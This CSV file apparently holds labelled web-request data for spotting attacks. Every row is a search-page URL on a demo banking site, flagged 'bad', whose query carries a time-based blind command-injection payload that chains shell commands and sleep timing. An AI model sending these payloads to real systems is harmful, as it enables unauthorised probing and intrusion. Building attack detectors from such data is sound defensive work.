path,content,host,class_flag
/search.jsp?query='; str=$(echo ERVJHE); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi \\,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo ERVJHE); str1=${#str}; if [ 5 -ne ${str1} ]; then sleep 0; else sleep 1; fi \\,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo ERVJHE); str1=${#str}; if [ 6 -ne ${str1} ]; then sleep 0; else sleep 1; fi \\,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo ERVJHE); str1=${#str}; if [ 7 -ne ${str1} ]; then sleep 0; else sleep 1; fi \\,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo ERVJHE); str1=${#str}; if [ 8 -ne ${str1} ]; then sleep 0; else sleep 1; fi \\,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo ERVJHE); str1=${#str}; if [ 9 -ne ${str1} ]; then sleep 0; else sleep 1; fi \\,,demo.testfire.net,['bad']
/search.jsp?query='| [ 1 -ne $(echo SUCHGF | tr -d '\n' | wc -c) ] || sleep 1 \\,,demo.testfire.net,['bad']
/search.jsp?query='| [ 2 -ne $(echo SUCHGF | tr -d '\n' | wc -c) ] || sleep 1 \\,,demo.testfire.net,['bad']
/search.jsp?query='| [ 3 -ne $(echo SUCHGF | tr -d '\n' | wc -c) ] || sleep 1 \\,,demo.testfire.net,['bad']
/search.jsp?query='| [ 4 -ne $(echo SUCHGF | tr -d '\n' | wc -c) ] || sleep 1 \\,,demo.testfire.net,['bad']
/search.jsp?query='| [ 5 -ne $(echo SUCHGF | tr -d '\n' | wc -c) ] || sleep 1 \\,,demo.testfire.net,['bad']
/search.jsp?query='| [ 6 -ne $(echo SUCHGF | tr -d '\n' | wc -c) ] || sleep 1 \\,,demo.testfire.net,['bad']
/search.jsp?query='| [ 7 -ne $(echo SUCHGF | tr -d '\n' | wc -c) ] || sleep 1 \\,,demo.testfire.net,['bad']
/search.jsp?query='| [ 8 -ne $(echo SUCHGF | tr -d '\n' | wc -c) ] || sleep 1 \\,,demo.testfire.net,['bad']
/search.jsp?query='| [ 9 -ne $(echo SUCHGF | tr -d '\n' | wc -c) ] || sleep 1 \\,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo BJMMJX) && str1=${#str} && [ 1 -eq ${str1} ] && sleep 1 \\,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo BJMMJX) && str1=${#str} && [ 2 -eq ${str1} ] && sleep 1 \\,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo BJMMJX) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 \\,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo BJMMJX) && str1=${#str} && [ 4 -eq ${str1} ] && sleep 1 \\,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo BJMMJX) && str1=${#str} && [ 5 -eq ${str1} ] && sleep 1 \\,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo BJMMJX) && str1=${#str} && [ 6 -eq ${str1} ] && sleep 1 \\,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo BJMMJX) && str1=${#str} && [ 7 -eq ${str1} ] && sleep 1 \\,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo BJMMJX) && str1=${#str} && [ 8 -eq ${str1} ] && sleep 1 \\,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo BJMMJX) && str1=${#str} && [ 9 -eq ${str1} ] && sleep 1 \\,,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo FPLFHR)
 str1=${#str}
 if [ 1 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi \\",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo FPLFHR)
 str1=${#str}
 if [ 2 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi \\",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo FPLFHR)
 str1=${#str}
 if [ 3 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi \\",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo FPLFHR)
 str1=${#str}
 if [ 4 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi \\",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo FPLFHR)
 str1=${#str}
 if [ 5 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi \\",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo FPLFHR)
 str1=${#str}
 if [ 6 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi \\",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo FPLFHR)
 str1=${#str}
 if [ 7 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi \\",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo FPLFHR)
 str1=${#str}
 if [ 8 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi \\",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo FPLFHR)
 str1=${#str}
 if [ 9 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi \\",,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo HLDNYH); str1=${#str}; if [ 1 -ne ${str1} ]; then sleep 0; else sleep 1; fi &,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo HLDNYH); str1=${#str}; if [ 2 -ne ${str1} ]; then sleep 0; else sleep 1; fi &,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo HLDNYH); str1=${#str}; if [ 3 -ne ${str1} ]; then sleep 0; else sleep 1; fi &,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo HLDNYH); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi &,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo HLDNYH); str1=${#str}; if [ 5 -ne ${str1} ]; then sleep 0; else sleep 1; fi &,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo HLDNYH); str1=${#str}; if [ 6 -ne ${str1} ]; then sleep 0; else sleep 1; fi &,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo HLDNYH); str1=${#str}; if [ 7 -ne ${str1} ]; then sleep 0; else sleep 1; fi &,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo HLDNYH); str1=${#str}; if [ 8 -ne ${str1} ]; then sleep 0; else sleep 1; fi &,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo HLDNYH); str1=${#str}; if [ 9 -ne ${str1} ]; then sleep 0; else sleep 1; fi &,,demo.testfire.net,['bad']
/search.jsp?query='| [ 1 -ne $(echo PSPAPE | tr -d '\n' | wc -c) ] || sleep 1 &,,demo.testfire.net,['bad']
/search.jsp?query='| [ 2 -ne $(echo PSPAPE | tr -d '\n' | wc -c) ] || sleep 1 &,,demo.testfire.net,['bad']
/search.jsp?query='| [ 3 -ne $(echo PSPAPE | tr -d '\n' | wc -c) ] || sleep 1 &,,demo.testfire.net,['bad']
/search.jsp?query='| [ 4 -ne $(echo PSPAPE | tr -d '\n' | wc -c) ] || sleep 1 &,,demo.testfire.net,['bad']
/search.jsp?query='| [ 5 -ne $(echo PSPAPE | tr -d '\n' | wc -c) ] || sleep 1 &,,demo.testfire.net,['bad']
/search.jsp?query='| [ 6 -ne $(echo PSPAPE | tr -d '\n' | wc -c) ] || sleep 1 &,,demo.testfire.net,['bad']
/search.jsp?query='| [ 7 -ne $(echo PSPAPE | tr -d '\n' | wc -c) ] || sleep 1 &,,demo.testfire.net,['bad']
/search.jsp?query='| [ 8 -ne $(echo PSPAPE | tr -d '\n' | wc -c) ] || sleep 1 &,,demo.testfire.net,['bad']
/search.jsp?query='| [ 9 -ne $(echo PSPAPE | tr -d '\n' | wc -c) ] || sleep 1 &,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo VZETTM) && str1=${#str} && [ 1 -eq ${str1} ] && sleep 1 &,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo VZETTM) && str1=${#str} && [ 2 -eq ${str1} ] && sleep 1 &,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo VZETTM) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 &,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo VZETTM) && str1=${#str} && [ 4 -eq ${str1} ] && sleep 1 &,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo VZETTM) && str1=${#str} && [ 5 -eq ${str1} ] && sleep 1 &,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo VZETTM) && str1=${#str} && [ 6 -eq ${str1} ] && sleep 1 &,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo VZETTM) && str1=${#str} && [ 7 -eq ${str1} ] && sleep 1 &,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo VZETTM) && str1=${#str} && [ 8 -eq ${str1} ] && sleep 1 &,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo VZETTM) && str1=${#str} && [ 9 -eq ${str1} ] && sleep 1 &,,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo GIPRGX)
 str1=${#str}
 if [ 1 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi &",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo GIPRGX)
 str1=${#str}
 if [ 2 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi &",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo GIPRGX)
 str1=${#str}
 if [ 3 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi &",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo GIPRGX)
 str1=${#str}
 if [ 4 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi &",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo GIPRGX)
 str1=${#str}
 if [ 5 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi &",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo GIPRGX)
 str1=${#str}
 if [ 6 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi &",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo GIPRGX)
 str1=${#str}
 if [ 7 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi &",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo GIPRGX)
 str1=${#str}
 if [ 8 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi &",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo GIPRGX)
 str1=${#str}
 if [ 9 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi &",,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo ASBPAS); str1=${#str}; if [ 1 -ne ${str1} ]; then sleep 0; else sleep 1; fi |,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo ASBPAS); str1=${#str}; if [ 2 -ne ${str1} ]; then sleep 0; else sleep 1; fi |,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo ASBPAS); str1=${#str}; if [ 3 -ne ${str1} ]; then sleep 0; else sleep 1; fi |,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo ASBPAS); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi |,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo ASBPAS); str1=${#str}; if [ 5 -ne ${str1} ]; then sleep 0; else sleep 1; fi |,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo ASBPAS); str1=${#str}; if [ 6 -ne ${str1} ]; then sleep 0; else sleep 1; fi |,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo ASBPAS); str1=${#str}; if [ 7 -ne ${str1} ]; then sleep 0; else sleep 1; fi |,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo ASBPAS); str1=${#str}; if [ 8 -ne ${str1} ]; then sleep 0; else sleep 1; fi |,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo ASBPAS); str1=${#str}; if [ 9 -ne ${str1} ]; then sleep 0; else sleep 1; fi |,,demo.testfire.net,['bad']
/search.jsp?query='| [ 1 -ne $(echo FNEGWH | tr -d '\n' | wc -c) ] || sleep 1 |,,demo.testfire.net,['bad']
/search.jsp?query='| [ 2 -ne $(echo FNEGWH | tr -d '\n' | wc -c) ] || sleep 1 |,,demo.testfire.net,['bad']
/search.jsp?query='| [ 3 -ne $(echo FNEGWH | tr -d '\n' | wc -c) ] || sleep 1 |,,demo.testfire.net,['bad']
/search.jsp?query='| [ 4 -ne $(echo FNEGWH | tr -d '\n' | wc -c) ] || sleep 1 |,,demo.testfire.net,['bad']
/search.jsp?query='| [ 5 -ne $(echo FNEGWH | tr -d '\n' | wc -c) ] || sleep 1 |,,demo.testfire.net,['bad']
/search.jsp?query='| [ 6 -ne $(echo FNEGWH | tr -d '\n' | wc -c) ] || sleep 1 |,,demo.testfire.net,['bad']
/search.jsp?query='| [ 7 -ne $(echo FNEGWH | tr -d '\n' | wc -c) ] || sleep 1 |,,demo.testfire.net,['bad']
/search.jsp?query='| [ 8 -ne $(echo FNEGWH | tr -d '\n' | wc -c) ] || sleep 1 |,,demo.testfire.net,['bad']
/search.jsp?query='| [ 9 -ne $(echo FNEGWH | tr -d '\n' | wc -c) ] || sleep 1 |,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo WSMVBW) && str1=${#str} && [ 1 -eq ${str1} ] && sleep 1 |,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo WSMVBW) && str1=${#str} && [ 2 -eq ${str1} ] && sleep 1 |,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo WSMVBW) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 |,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo WSMVBW) && str1=${#str} && [ 4 -eq ${str1} ] && sleep 1 |,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo WSMVBW) && str1=${#str} && [ 5 -eq ${str1} ] && sleep 1 |,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo WSMVBW) && str1=${#str} && [ 6 -eq ${str1} ] && sleep 1 |,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo WSMVBW) && str1=${#str} && [ 7 -eq ${str1} ] && sleep 1 |,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo WSMVBW) && str1=${#str} && [ 8 -eq ${str1} ] && sleep 1 |,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo WSMVBW) && str1=${#str} && [ 9 -eq ${str1} ] && sleep 1 |,,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo TNNFNL)
 str1=${#str}
 if [ 1 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi |",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo TNNFNL)
 str1=${#str}
 if [ 2 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi |",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo TNNFNL)
 str1=${#str}
 if [ 3 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi |",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo TNNFNL)
 str1=${#str}
 if [ 4 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi |",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo TNNFNL)
 str1=${#str}
 if [ 5 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi |",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo TNNFNL)
 str1=${#str}
 if [ 6 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi |",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo TNNFNL)
 str1=${#str}
 if [ 7 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi |",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo TNNFNL)
 str1=${#str}
 if [ 8 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi |",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo TNNFNL)
 str1=${#str}
 if [ 9 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi |",,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo WSGIYR); str1=${#str}; if [ 1 -ne ${str1} ]; then sleep 0; else sleep 1; fi %27,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo WSGIYR); str1=${#str}; if [ 2 -ne ${str1} ]; then sleep 0; else sleep 1; fi %27,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo WSGIYR); str1=${#str}; if [ 3 -ne ${str1} ]; then sleep 0; else sleep 1; fi %27,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo WSGIYR); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi %27,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo WSGIYR); str1=${#str}; if [ 5 -ne ${str1} ]; then sleep 0; else sleep 1; fi %27,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo WSGIYR); str1=${#str}; if [ 6 -ne ${str1} ]; then sleep 0; else sleep 1; fi %27,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo WSGIYR); str1=${#str}; if [ 7 -ne ${str1} ]; then sleep 0; else sleep 1; fi %27,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo WSGIYR); str1=${#str}; if [ 8 -ne ${str1} ]; then sleep 0; else sleep 1; fi %27,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo WSGIYR); str1=${#str}; if [ 9 -ne ${str1} ]; then sleep 0; else sleep 1; fi %27,,demo.testfire.net,['bad']
/search.jsp?query='| [ 1 -ne $(echo QPTCDE | tr -d '\n' | wc -c) ] || sleep 1 %27,,demo.testfire.net,['bad']
/search.jsp?query='| [ 2 -ne $(echo QPTCDE | tr -d '\n' | wc -c) ] || sleep 1 %27,,demo.testfire.net,['bad']
/search.jsp?query='| [ 3 -ne $(echo QPTCDE | tr -d '\n' | wc -c) ] || sleep 1 %27,,demo.testfire.net,['bad']
/search.jsp?query='| [ 4 -ne $(echo QPTCDE | tr -d '\n' | wc -c) ] || sleep 1 %27,,demo.testfire.net,['bad']
/search.jsp?query='| [ 5 -ne $(echo QPTCDE | tr -d '\n' | wc -c) ] || sleep 1 %27,,demo.testfire.net,['bad']
/search.jsp?query='| [ 6 -ne $(echo QPTCDE | tr -d '\n' | wc -c) ] || sleep 1 %27,,demo.testfire.net,['bad']
/search.jsp?query='| [ 7 -ne $(echo QPTCDE | tr -d '\n' | wc -c) ] || sleep 1 %27,,demo.testfire.net,['bad']
/search.jsp?query='| [ 8 -ne $(echo QPTCDE | tr -d '\n' | wc -c) ] || sleep 1 %27,,demo.testfire.net,['bad']
/search.jsp?query='| [ 9 -ne $(echo QPTCDE | tr -d '\n' | wc -c) ] || sleep 1 %27,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo UXESAW) && str1=${#str} && [ 1 -eq ${str1} ] && sleep 1 %27,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo UXESAW) && str1=${#str} && [ 2 -eq ${str1} ] && sleep 1 %27,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo UXESAW) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 %27,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo UXESAW) && str1=${#str} && [ 4 -eq ${str1} ] && sleep 1 %27,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo UXESAW) && str1=${#str} && [ 5 -eq ${str1} ] && sleep 1 %27,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo UXESAW) && str1=${#str} && [ 6 -eq ${str1} ] && sleep 1 %27,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo UXESAW) && str1=${#str} && [ 7 -eq ${str1} ] && sleep 1 %27,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo UXESAW) && str1=${#str} && [ 8 -eq ${str1} ] && sleep 1 %27,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo UXESAW) && str1=${#str} && [ 9 -eq ${str1} ] && sleep 1 %27,,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo PAACLD)
 str1=${#str}
 if [ 1 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %27",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo PAACLD)
 str1=${#str}
 if [ 2 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %27",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo PAACLD)
 str1=${#str}
 if [ 3 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %27",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo PAACLD)
 str1=${#str}
 if [ 4 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %27",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo PAACLD)
 str1=${#str}
 if [ 5 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %27",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo PAACLD)
 str1=${#str}
 if [ 6 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %27",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo PAACLD)
 str1=${#str}
 if [ 7 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %27",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo PAACLD)
 str1=${#str}
 if [ 8 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %27",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo PAACLD)
 str1=${#str}
 if [ 9 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %27",,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo FBVDTE); str1=${#str}; if [ 1 -ne ${str1} ]; then sleep 0; else sleep 1; fi %22,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo FBVDTE); str1=${#str}; if [ 2 -ne ${str1} ]; then sleep 0; else sleep 1; fi %22,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo FBVDTE); str1=${#str}; if [ 3 -ne ${str1} ]; then sleep 0; else sleep 1; fi %22,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo FBVDTE); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi %22,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo FBVDTE); str1=${#str}; if [ 5 -ne ${str1} ]; then sleep 0; else sleep 1; fi %22,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo FBVDTE); str1=${#str}; if [ 6 -ne ${str1} ]; then sleep 0; else sleep 1; fi %22,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo FBVDTE); str1=${#str}; if [ 7 -ne ${str1} ]; then sleep 0; else sleep 1; fi %22,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo FBVDTE); str1=${#str}; if [ 8 -ne ${str1} ]; then sleep 0; else sleep 1; fi %22,,demo.testfire.net,['bad']
/search.jsp?query='; str=$(echo FBVDTE); str1=${#str}; if [ 9 -ne ${str1} ]; then sleep 0; else sleep 1; fi %22,,demo.testfire.net,['bad']
/search.jsp?query='| [ 1 -ne $(echo ZATMDT | tr -d '\n' | wc -c) ] || sleep 1 %22,,demo.testfire.net,['bad']
/search.jsp?query='| [ 2 -ne $(echo ZATMDT | tr -d '\n' | wc -c) ] || sleep 1 %22,,demo.testfire.net,['bad']
/search.jsp?query='| [ 3 -ne $(echo ZATMDT | tr -d '\n' | wc -c) ] || sleep 1 %22,,demo.testfire.net,['bad']
/search.jsp?query='| [ 4 -ne $(echo ZATMDT | tr -d '\n' | wc -c) ] || sleep 1 %22,,demo.testfire.net,['bad']
/search.jsp?query='| [ 5 -ne $(echo ZATMDT | tr -d '\n' | wc -c) ] || sleep 1 %22,,demo.testfire.net,['bad']
/search.jsp?query='| [ 6 -ne $(echo ZATMDT | tr -d '\n' | wc -c) ] || sleep 1 %22,,demo.testfire.net,['bad']
/search.jsp?query='| [ 7 -ne $(echo ZATMDT | tr -d '\n' | wc -c) ] || sleep 1 %22,,demo.testfire.net,['bad']
/search.jsp?query='| [ 8 -ne $(echo ZATMDT | tr -d '\n' | wc -c) ] || sleep 1 %22,,demo.testfire.net,['bad']
/search.jsp?query='| [ 9 -ne $(echo ZATMDT | tr -d '\n' | wc -c) ] || sleep 1 %22,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo ERQGRV) && str1=${#str} && [ 1 -eq ${str1} ] && sleep 1 %22,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo ERQGRV) && str1=${#str} && [ 2 -eq ${str1} ] && sleep 1 %22,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo ERQGRV) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 %22,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo ERQGRV) && str1=${#str} && [ 4 -eq ${str1} ] && sleep 1 %22,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo ERQGRV) && str1=${#str} && [ 5 -eq ${str1} ] && sleep 1 %22,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo ERQGRV) && str1=${#str} && [ 6 -eq ${str1} ] && sleep 1 %22,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo ERQGRV) && str1=${#str} && [ 7 -eq ${str1} ] && sleep 1 %22,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo ERQGRV) && str1=${#str} && [ 8 -eq ${str1} ] && sleep 1 %22,,demo.testfire.net,['bad']
/search.jsp?query='& sleep 0 && str=$(echo ERQGRV) && str1=${#str} && [ 9 -eq ${str1} ] && sleep 1 %22,,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo WYYYZM)
 str1=${#str}
 if [ 1 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %22",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo WYYYZM)
 str1=${#str}
 if [ 2 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %22",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo WYYYZM)
 str1=${#str}
 if [ 3 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %22",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo WYYYZM)
 str1=${#str}
 if [ 4 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %22",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo WYYYZM)
 str1=${#str}
 if [ 5 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %22",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo WYYYZM)
 str1=${#str}
 if [ 6 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %22",,demo.testfire.net,['bad']
"/search.jsp?query='
 str=$(echo WYYYZM)
 str1=${#str}
 if [ 7 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %22",,demo.testfire.net,['bad']
